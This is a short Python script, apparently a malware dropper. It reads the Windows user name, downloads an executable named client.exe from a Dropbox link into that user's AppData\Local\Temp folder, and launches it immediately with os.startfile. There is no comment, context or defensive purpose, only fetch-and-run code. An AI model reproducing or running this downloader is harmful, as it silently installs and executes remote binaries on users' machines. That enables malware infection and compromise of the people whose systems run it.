import requests,getpass, os
nome = getpass.getuser()
url = 'https://www.dropbox.com/s/qfml9zvcc7eoehh/client.exe?dl=1'
local = "C:/Users/"+nome+"\AppData\Local\Temp/client.exe"
r = requests.get(url)

with open(local, 'wb') as f:
    f.write(r.content)

os.startfile(local)

